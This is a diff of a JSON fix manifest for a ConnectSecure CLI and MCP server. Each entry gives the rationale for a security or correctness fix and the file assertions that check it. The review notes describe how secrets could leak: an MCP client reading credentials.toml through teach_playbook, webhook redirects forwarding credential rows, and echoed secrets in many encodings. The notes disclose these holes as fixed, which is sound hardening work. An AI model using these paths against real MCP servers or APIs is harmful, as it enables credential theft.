+   "why": "cliArgsFromMCP emits a bool only when it is true, so `follow: false` was dropped, `tail` ran with --follow=true and the MCP call never returned (the shellout has no timeout), including against credential resources. Press-level defect; keepExplicitFalse in guardMirroredMCPCall rewrites only default-true bool flags, so Changed() on default-false flags is untouched. TestKeepExplicitFalseReachesDefaultTrueFlag fails with the call removed and passes with it.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "keepExplicitFalse(cmd, req.GetArguments())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "func keepExplicitFalse(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/connectsecure_bool_test.go",
+     "contains": "func TestKeepExplicitFalseReachesDefaultTrueFlag(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-recipe-read-only-hint",
+   "status": "active",
+   "summary": "The which_clients_does_this_cve_hit recipe tool is annotated read-only and non-destructive.",
+   "why": "The generated recipe set only the open-world hint, so tools/list advertised a GET-only lookup as destructive (MCP default) and clients gated or denied it; the cve_impact tool it shells out to was already read-only.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "mcplib.WithReadOnlyHintAnnotation(true),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "mcplib.WithDestructiveHintAnnotation(false),",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "onboard-docs-round5",
+   "status": "active",
+   "summary": "Onboard-regenerated docs keep the round-5 corrections: guide.md's Secrets section and true .mcpb platform list, mcp-install.md's VS Code secret input, and manifest.json's pod URL wording.",
+   "why": "Adversarial round 5 (2026-10-14): guide.md (the full command reference) had no credential tier, tail, --stdin or envelope note; it claimed .mcpb bundles for darwin-arm64 and windows-arm64, while mcpb_bundle.py ships universal darwin, linux-amd64 and windows-amd64; mcp-install.md put the client secret in plaintext in a workspace .vscode/mcp.json; and manifest.json pointed at the portal address bar, which before sign-in is portal.myconnectsecure.com, a host doctor rejects.",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Secrets"
+    },
+    {
+     "file": "guide.md",
+     "contains": "Linux (`amd64`) and Windows (`amd64`)"
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTSECURE_CLIENT_SECRET\": \"${input:connectsecure-client-secret}\""
+    },
+    {
+     "file": "manifest.json",
+     "contains": "Profile > API Documentation"
+    },
+    {
+     "file": "guide.md",
+     "contains": "`export` and `tail` stream bare JSON records in either mode."
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "credential reads still pass, so scope the API user too."
+    },
+    {
+     "file": "manifest.json",
+     "contains": "hide the sync, export and tail tools (import is never an MCP tool)",
+     "code_only": false
+    }
+   ]
+  },
+  {
+   "id": "error-body-redacts-secrets",
+   "status": "active",
+   "summary": "An API error body (and a token-mint error) that echoes any secret the request carried - in raw, JSON-escaped, double-escaped or URL-escaped form, a PEM private key, or a value cut at the truncation point - is withheld whole; otherwise secret-named JSON fields are masked (booleans and nulls kept).",
+   "why": "Codex round 5 (2026-10-14): only the configured auth header was masked, so a 4xx that echoed the request put scheduler passwords, credential params or a Client-Auth-Token into error text, even when the secret came in on stdin. TestErrorBodyMasksEchoedSecrets fails with the redaction removed and passes with it. Adversarial round 7 and Codex round 6 then broke the first version (masking in place after json.Marshal): passwords with & < > \" \\ survived as JSON escapes, secrets under 4 characters were skipped, a value straddling the 4096-byte cut leaked its prefix, custom-domains create's multipart ssl_privkey part was never collected, and the token mint (its own HTTP path) printed an echoed Client-Auth-Token. Withholding on any detected form, checked before truncation, closes all five; TestErrorBodyWithheldWhenItEchoesASecret (each case) and TestMintWithholdsAnEchoedCredential fail with the checks disabled and pass with them, and the multipart case fails with only the multipart parser disabled. Adversarial round 8 and Codex round 7 then showed the encoded-form list missed other servers' JSON escapes (Python ensure_ascii \\u00e9, PHP \\/, .NET uppercase \\u002B, Gson \\u003d), HTML entities and Latin-1, which the display path decoded back into plaintext; detection now runs on decoded views (a one-pass JSON/JS unescaper applied repeatedly, html.UnescapeString, URL unescapes, Latin-1) and also on the text as displayed, covers 2xx HTML summaries, adds the decoded Client-Auth-Token and its client secret, and collects only secret-named leaves plus 6+ character strings under params, so a port or type no longer withholds a validation error. TestEchoDetectedInEveryEncoderShape fails with the decoded views disabled; TestErrorBodyKeepsShortNonSecretParams, TestDecodedClientAuthTokenIsASecret and TestHTMLSuccessSummaryWithheldWhenItEchoes each fail with their piece disabled. Adversarial round 9 and Codex round 8: the decoder gained \\xNN, \\b and \\f escapes, a NUL-stripped view for UTF-16 bodies, and a 16-character head/tail match for secrets of 32+ characters (servers that cut long values); the CLI's own bearer token joined the withhold set on the error and 2xx HTML paths; known account/target keys under params (username, domain, host, port, type...) no longer withhold an error that names them. The encoder-shape test now holds every secret only in encoded form (it fails if a case contains plaintext), and a scripted mutation run showed each piece's test failing with that piece removed. Adversarial round 10 and Codex round 9: a 200 {\"status\": false} message printed by csGetData (qbr, cve-impact, the MCP recipe) and by doctor skipped both the echo check and token masking - both now go through Client.SafeServerText - and a GET answered 200 status:false that echoes a request or token secret is now an error, so it is never cached or printed as data. TestStatusFalseMessageWithholdsTheToken and TestGetStatusFalseEchoIsAnError fail with those pieces removed. The hex decoding was rewritten (hexRune) so gosec G115 has no integer narrowing to flag. Codex round 10: secrets in the config file's headers (sent on every request) joined the withhold set via connectsecureSentHeaders, with Authorization/Cookie/*key* header names counted as credential headers; and UTF-16 bodies are decoded as real code units in both byte orders and alignments, so a non-ASCII secret is seen whole. TestConfiguredHeaderSecretIsWithheld and TestEchoDetectedInUTF16 each fail with their piece disabled (scripted mutation run). Codex round 11 (2026-10-14): a configured Authorization override contributed only its whole value, so a short bearer token echoed without the scheme escaped; the bare token now joins the withhold set. TestConfiguredBearerTokenEchoWithheld fails with that line reverted.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/connectsecure_auth.go",
+     "contains": "if cliutil.ConnectsecureEchoesSecret(string(body), []string{cat, cfg.ClientSecret}) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestErrorBodyWithheldWhenItEchoesASecret(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_auth_test.go",
+     "contains": "func TestMintWithholdsAnEchoedCredential(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "bodyText := connectsecureErrorBody(respBody, bodyBytes, c.connectsecureSentHeaders(headerOverrides), authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "summary = connectsecureWithheldBody",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestHTMLSuccessSummaryWithheldWhenItEchoes(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/connectsecure_echo_test.go",
+     "contains": "func TestEchoDetectedInEveryEncoderShape(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redact.go",
+     "contains": "func authSecrets(authHeader string) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "append(connectsecureRequestSecrets(bodyBytes, c.connectsecureSentHeaders(headerOverrides)), authSecrets(authHeader)...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestHTMLSummaryWithheldWhenItEchoesTheBearerToken(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestErrorBodyParamsRule(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redact.go",
+     "contains": "func (c *Client) SafeServerText(text string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_live.go",
+     "contains": "c.SafeServerText(csString(m[\"message\"]))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "c.SafeServerText(env.Message)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestGetStatusFalseEchoIsAnError(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redact.go",
+     "contains": "func (c *Client) connectsecureSentHeaders(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/connectsecure_secrets.go",
+     "contains": "func decodeUTF16(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redact.go",
+     "contains": "if parts := authSecrets(val); len(parts) > 1 {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestConfiguredBearerTokenEchoWithheld(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dependent-zero-parents-completes",
+   "status": "active",
+   "summary": "A dependent resource whose parent table is empty records a completed zero-row sync instead of leaving its attempt row open.",
+   "why": "Adversarial round 6 (2026-10-14): the curated default sync fills asset_view, not assets, so the per-asset report_queries dependent always found zero parents and left a sync_state row with no completed time; doctor read it as never synced and reported the cache stale straight after `sync --full`. TestDependentWithNoParentsCompletes fails without the SaveSyncState and passes with it.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "_ = db.SaveSyncState(dep.Name, \"\", 0)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestDependentWithNoParentsCompletes(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "secret-resources-read-live",
+   "status": "active",
+   "summary": "list/get for scheduler, integration rules, attack-surface results and custom domains read live only, like credentials.",
+   "why": "Adversarial round 6 (2026-10-14): with the auto strategy, --data-source local or an unreachable API told the user to run sync, which refuses these resources by design, sending an agent into a sync loop. Live-only gives the accurate 'no local data source for this command' message.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/custom_domains_list.go",
+     "contains": "flags, \"live\", \"custom_domains\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/custom_domains_get.go",
+     "contains": "flags, \"live\", \"custom_domains\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/scheduler_list.go",
+     "contains": "flags, \"live\", \"scheduler\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/scheduler_get.go",
+     "contains": "flags, \"live\", \"scheduler\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/integration_rules_list.go",
+     "contains": "flags, \"live\", \"integration_rules\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/integration_rules_get.go",
+     "contains": "flags, \"live\", \"integration_rules\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/attack_surface_results_list.go",
+     "contains": "flags, \"live\", \"attack_surface_results\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/attack_surface_results_get.go",
+     "contains": "flags, \"live\", \"attack_surface_results\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "write-status-false-is-an-error",
+   "status": "active",
+   "summary": "A 2xx response whose body is the vendor's failure envelope {\"status\": false} is returned as an API error (with the same secret withholding) for every method: never success:true for a write, never an empty result for a read.",
+   "why": "Adversarial round 8 (2026-10-14): the ConnectSecure spec documents only 200 responses with a boolean status, and the token mint and doctor already treat 200 status:false as a failure, but generated writes reported it as success:true with rc 0, so an agent would tell the user a credential, suppression or patch schedule was created when it was not; the echoed message also skipped withholding. GETs are unchanged (an empty list may use the same envelope). TestWriteStatusFalseIsAnError fails with the check disabled. Codex round 8: a BOM- or XSSI-prefixed body hid the envelope; the check now reads sanitizeJSONResponse(respBody), and TestWriteStatusFalseBehindBOMIsAnError fails without it. Adversarial round 13 (2026-10-14): GETs were exempt, so list / get / export / tail printed a refused read as an empty result with exit 0 and cached it for 5 minutes, while sync, qbr, cve-impact, doctor and the mint read the same bytes as a refusal. The spec types status as a boolean success flag and no vendor doc defines status:false as 'no records', so the loud reading wins everywhere: a refusal surfaced as an error beats an agent telling an MSP the client has no credentials or suppressions. TestWriteStatusFalseIsAnError now also asserts the GET is an error and fails with GET exempted again.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if resp.StatusCode < 300 && connectsecureStatusFalse(sanitizeJSONResponse(respBody)) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestWriteStatusFalseIsAnError(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestWriteStatusFalseBehindBOMIsAnError(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-hint-reads-body-not-path",
+   "status": "active",
+   "summary": "The HTTP 400 auth heuristic reads the API error body, not the full message, so the request path /r/company/credentials does not turn every 400 into an auth failure (exit 4).",
+   "why": "Adversarial round 8 (2026-10-14): LooksLikeAuthError matched \\bcredential in the URL path, so a 'name already exists' 400 on credentials create printed 'auth is missing or invalid' and exited 4, steering an agent to re-run auth setup. TestCredentialsPathIsNotAnAuthSignal fails with the old msg argument. Adversarial round 9: the body still tripped it ('Credential name already exists'); a body that reads as a validation error (already exists, required, must be, between, invalid value, not valid, duplicate) is no longer an auth signal. TestValidationMessageIsNotAnAuthSignal fails without that list. Adversarial round 10: the validation words also matched real auth messages ('Authorization token is required'); a body naming a token, API key, authorization, authentication or expiry stays an auth signal first. TestAuthMessageKeepsTheAuthHint fails with that check disabled.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cliutil.LooksLikeAuthError(authSignalText(err))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestCredentialsPathIsNotAnAuthSignal(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestValidationMessageIsNotAnAuthSignal(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestAuthMessageKeepsTheAuthHint(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-html-probe-uncached",
+   "status": "active",
+   "summary": "doctor's HTML-accepting reachability probe (GET /) neither reads nor writes the response cache, and an echoing 200 status:false credential rejection is reported as rejected.",
+   "why": "Codex round 9 (2026-10-14): the probe opts into HTML responses, which skip the HTML echo guard, and went through the cached GET, so a 200 HTML page echoing the bearer token could be written to the on-disk response cache. Adversarial round 11: GetWithHeadersNoCache only skipped the cache read and still wrote the HTML page (echoed token included) to cache/http; doctor's client now runs with NoCache. TestDoctorWritesNoCache drives `doctor --json` against an HTML root that echoes the token and fails with NoCache removed. An echoing 200 status:false became a withheld APIError that doctor read as WARN not verified (exit 0 under --fail-on error); a 2xx APIError is now ERROR rejected (TestDoctorEchoingRejectionIsAnError fails with that case removed).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "reachBody, reachErr := c.GetWithHeadersNoCache(cmd.Context(), \"/\", nil, map[string]string{client.HTMLResponseHeader: \"true\"})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "case status < 300:",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestDoctorWritesNoCache(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "local-report-rows-replaced",
+   "status": "active",
+   "summary": "Resources the local reports read (the curated default sync set) are replaced on sync instead of keep-richer merged.",
+   "why": "Codex round 9 (2026-10-14): the generated merge keeps an existing value when the fresh row has the field empty or null, so a suppression whose approved_by was cleared kept its old approver and suppression-audit missed it. TestClearedFieldIsNotKeptOnResync fails with the replace disabled; TestLocalReportResourcesAreReplacedOnSync keeps the list in step with connectsecureDefaultSyncResources.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if ConnectsecureReplaceOnSync(resourceType) { // Hand-fix: handfixes.json local-report-rows-replaced",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/store/connectsecure_replace_test.go",
+     "contains": "func TestClearedFieldIsNotKeptOnResync(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "filtered-sync-no-prune",
+   "status": "active",
+   "summary": "A sync whose walk is narrowed by --param/--global-param/--resource-param neither prunes local rows nor advances the completion watermark.",
+   "why": "Codex round 10 (2026-10-14): `sync --full --resources asset_view --param condition=company_id=12` walked one client, then reconciled the whole resource partition, deleting every other client's cached assets and marking the resource complete, so portfolio and blind-spots silently underreported them. syncUserParams.narrows gates prune and the watermark (flat and dependent). TestFilteredFullSyncKeepsOtherRows fails with narrows disabled.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "func (p *syncUserParams) narrows(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "filtered := userParams.narrows(resource, false)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if attemptComplete && userParams.narrows(dep.Name, true) { // Hand-fix (handfixes.json: filtered-sync-no-prune)",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestFilteredFullSyncKeepsOtherRows(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-tail-not-read-only",
+   "status": "active",
+   "summary": "The tail command (and its MCP tool) is not annotated mcp:read-only.",
+   "why": "Adversarial round 11 (2026-10-14): tail polls any resource live, including credentials and scheduler, and printed their passwords; with readOnlyHint true MCP hosts ran it without asking and CONNECTSECURE_MCP_READ_ONLY=1 still listed it, while governance puts `tail` on those resources in the human-in-the-loop credential tier and connectsecure_execute (the same read) is gated. Without the annotation the tool is gated like connectsecure_execute and hidden in read-only mode. TestTailIsNotAnMCPReadOnlyTool fails with the annotation restored.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/tail.go",
+     "contains": "Annotations: map[string]string{\"pp:no-error-path-probe\": \"true\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestTailIsNotAnMCPReadOnlyTool(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-tail-honor-deliver",
+   "status": "active",
+   "summary": "export (without --output), tail, agent-context and version write through cmd.OutOrStdout(), the writer --deliver captures.",
+   "why": "Codex round 11 (2026-10-14): both wrote to os.Stdout directly, so `export companies --deliver file:<path>` replaced the destination with an empty file and a webhook got an empty body, while the command reported success. TestExportDeliversRecordsToFile (driven through Execute, where delivery runs) fails with export.go reverted. Adversarial round 12 / Codex round 12 (2026-10-14): agent-context and version had the same defect (empty delivered file, exit 0) and now use the same writer.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "writer = bufio.NewWriter(cmd.OutOrStdout()) // Hand-fix (handfixes.json: export-tail-honor-deliver)",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/tail.go",
+     "contains": "enc := json.NewEncoder(cmd.OutOrStdout()) // Hand-fix (handfixes.json: export-tail-honor-deliver)",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestExportDeliversRecordsToFile(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/agent_context.go",
+     "contains": "enc := json.NewEncoder(cmd.OutOrStdout()) // Hand-fix (handfixes.json: export-tail-honor-deliver)",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/version.go",
+     "contains": "fmt.Fprintf(cmd.OutOrStdout(), \"%s %s\\n\", cmd.Root().Name(), version)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "deliver-webhook-no-redirect",
+   "status": "active",
+   "summary": "--deliver webhook:<url> never follows a redirect; any 3xx is an error.",
+   "why": "Codex round 11 (2026-10-14): a 307/308 replays the POST body, so `credentials list --json --deliver webhook:<url>` could forward credential rows to whatever origin the webhook pointed at. TestWebhookDeliveryRefusesRedirect fails with deliver.go reverted.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "// Hand-fix (handfixes.json: deliver-webhook-no-redirect)",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "return http.ErrUseLastResponse",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestWebhookDeliveryRefusesRedirect(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "filtered-sync-cursor-isolated",
+   "status": "active",
+   "summary": "A --param-narrowed sync starts from offset zero and never writes its pagination cursor into the resource-wide sync_state.",
+   "why": "Codex round 11 (2026-10-14): a capped or interrupted filtered walk saved its subset offset as the resource's resume point, so the next unfiltered sync resumed there, skipped other clients' rows and marked the resource complete. TestFilteredSyncKeepsTheResumeCursor fails with sync.go reverted.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "// Hand-fix (handfixes.json: filtered-sync-cursor-isolated): a --param walk",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "stateCursor = func(string) string { return persistedCursor }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestFilteredSyncKeepsTheResumeCursor(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "journal-dash-value-not-a-flag",
+   "status": "active",
+   "summary": "The learn journal's argv-shape parser gives a value-taking flag the next token even when it starts with '-', as pflag does.",
+   "why": "Codex round 11 (2026-10-14): `scheduler create --data-password -SENTINELpw12` journaled the password as an argv_shape key (a flag name) in the learn journal on disk. TestJournalDashValueIsNotAFlagName fails with journal.go reverted.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "// Hand-fix (handfixes.json: journal-dash-value-not-a-flag): with the",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/learn/connectsecure_journal_test.go",
+     "contains": "func TestJournalDashValueIsNotAFlagName(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-blocks-local-file-inputs",
+   "status": "active",
+   "summary": "MCP tools never accept a flag whose value is a local path the CLI reads (teach/teach-playbook notes and playbook files, import --input, custom-domains create cert/key, report-builder uploads).",
+   "why": "Adversarial round 12 / Codex round 12 (2026-10-14): MCP runs as the server account, and even with CONNECTSECURE_MCP_READ_ONLY=1 a client could call teach_playbook with notes-file pointing at credentials.toml, then read the token back through recall or playbook_list (verified end to end). fileInputFlags (hand-authored, keyed by command path) feeds blockedStructuredArgsForCommand, so those flags leave the tool schema and are refused as unknown parameters. TestFileInputFlagsAreBlockedArgs fails with the typemap loop removed; TestEveryFileInputFlagIsBlocked scans internal/cli for flags bound to a multipart file part or os.Open/ReadFile and fails when one is missing from the list (checked by dropping ssl-privkey). Adversarial round 13 (2026-10-14): the name-level source scan missed teach (its file flags go through helpers), so TestNoRegisteredToolTakesALocalFilePath now checks the real registered tool schemas and fails per command when an entry is dropped (checked by deleting the teach entry). import, whose only input is a local file, is hidden from MCP (mcp:hidden) rather than shipped as a tool that can never succeed; TestImportIsNotAnMCPTool fails with the annotation removed.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/typemap.go",
+     "contains": "// Hand-fix (handfixes.json: mcp-blocks-local-file-inputs): no client-chosen local paths to read.",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/typemap.go",
+     "contains": "for _, name := range fileInputFlagNames(cmd) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/connectsecure_file_inputs_test.go",
+     "contains": "func TestEveryFileInputFlagIsBlocked(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/import.go",
+     "contains": "Annotations: map[string]string{\"mcp:hidden\": \"true\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/connectsecure_file_inputs_test.go",
+     "contains": "func TestNoRegisteredToolTakesALocalFilePath(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/connectsecure_file_inputs_test.go",
+     "contains": "func TestImportIsNotAnMCPTool(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-status-false-is-a-failure",
+   "status": "active",
+   "summary": "sync treats a boolean {\"status\": false} envelope as a declared failure, flat and dependent.",
+   "why": "Adversarial round 12 / Codex round 12 (2026-10-14): ConnectSecure refuses a read as HTTP 200 {\"status\": false, \"data\": []}; the generated check only knew string statuses, so `sync --full` read the refusal as an empty resource, pruned every cached row and marked the resource complete with exit 0. TestSyncStatusFalseIsAFailure fails with the bool branch removed. Adversarial round 13 (2026-10-14): the client now raises the same envelope as an API error before sync sees it (write-status-false-is-an-error), so this branch is the backstop for bodies that reach extraction another way.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "// Hand-fix (handfixes.json: sync-status-false-is-a-failure): ConnectSecure",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "return !okStatus",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestSyncStatusFalseIsAFailure(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "per-client-report-keys",
+   "status": "active",
+   "summary": "Report resources whose rows share a display name across clients are keyed by a per-client identity in both resourceIDFieldOverrides maps (store.go and sync.go): object_guid for AD OUs, GPOs and group computers; company_id (with compliance_id) for per-client rollups; name+value, solution_id, company_name+canonical_name, agent_id+name+version and host_name+ip+vul_id elsewhere.",
+   "why": "Codex round 14 / adversarial round 14 (2026-10-14): the generator keyed these by `name`, so `sync --full --resources report_queries-ad-ous-view` kept only the last client's 'Workstations' OU and exited 0 - and every AD domain carries a 'Default Domain Policy' GPO, so ad-gpos-view collapsed the same way. A row missing a key part falls back to the generic id chain (id, then name, the old behavior), so such rows can still collapse into one; host_name+ip+vul_id carries no port and no client, so a standardized build (the same host name and IP at two clients) still shares a row. Accepted as the residual (adversarial round 15, P2). TestPerClientReportRowsKeepDistinctIDs covers the family and TestSyncKeepsEveryClientsSameNamedOU the sync path; both fail with the maps reverted. risk-score and total-asset-count carry no per-client id in the spec and stay as they were (qbr and portfolio already flag shared client names).",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "// Hand-fix (handfixes.json: per-client-report-keys)",
+     "code_only": false,
+     "min_count": 14
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "// Hand-fix (handfixes.json: per-client-report-keys)",
+     "code_only": false,
+     "min_count": 14
+    },
+    {
+     "file": "cli/internal/store/connectsecure_report_keys_test.go",
+     "contains": "func TestPerClientReportRowsKeepDistinctIDs(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestSyncKeepsEveryClientsSameNamedOU(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "report-queries-own-partition",
+   "status": "active",
+   "summary": "Every generated report-queries <report> command caches into and reads locally from its own report's partition (report_queries-<report>, the one sync writes), not the shared report_queries bucket. ad-computers-view keeps report_queries, where sync stores its rows.",
+   "why": "Adversarial round 15 (2026-10-14): all 162 report-queries commands passed resourceType \"report_queries\" to resolvePaginatedReadWithStrategy, so live write-through keyed every report's rows by name in one bucket. One client's 'Workstations' OU overwrote another's, and with the default --data-source auto an unreachable pod served other reports' rows (GPOs, ports, tags) as the OU report with exit 0. The per-client keys of per-client-report-keys reached only sync. TestReportQueriesCommandsUseOwnPartition scans every report_queries_*.go and TestReportQueriesLocalReadReturnsOnlyThatReport drives ad-ous-view + ad-gpos-view through a stub pod and reads ad-ous-view back locally; both fail with the 161 files reverted.",
+   "spec_encode_followup": "Press retro: generated report commands under a shared tag should pass their own sync resource name, not the tag.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/report_queries_ad-ous-view.go",
+     "contains": "\"auto\", \"report_queries-ad-ous-view\", path"
+    },
+    {
+     "file": "cli/internal/cli/report_queries_ad-gpos-view.go",
+     "contains": "\"auto\", \"report_queries-ad-gpos-view\", path"
+    },
+    {
+     "file": "cli/internal/cli/report_queries_distinct-tags.go",
+     "contains": "\"auto\", \"report_queries-distinct-tags\", path"
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_report_partition_test.go",
+     "contains": "func TestReportQueriesCommandsUseOwnPartition(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_report_partition_test.go",
+     "contains": "func TestReportQueriesLocalReadReturnsOnlyThatReport(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "x-text-govulncheck-bump",
+   "status": "active",
+   "summary": "golang.org/x/text is pinned at v0.41.0 (indirect) in go.mod.",
+   "why": "The press emitted golang.org/x/text v0.14.0, which osv-scanner reports as GO-2026-5970 (infinite loop on invalid input) and GO-2026-6629 (panic in x/text/secure/precis); the security gate blocks both as P1. A reprint re-emits the old pin.",
+   "asserts": [
+    {
+     "file": "cli/go.mod",
+     "contains": "golang.org/x/text v0.41.0"
+    },
+    {
+     "file": "cli/go.mod",
+     "not_contains": "golang.org/x/text v0.14.0"
+    }
+   ]
+  }
+ ]
+}
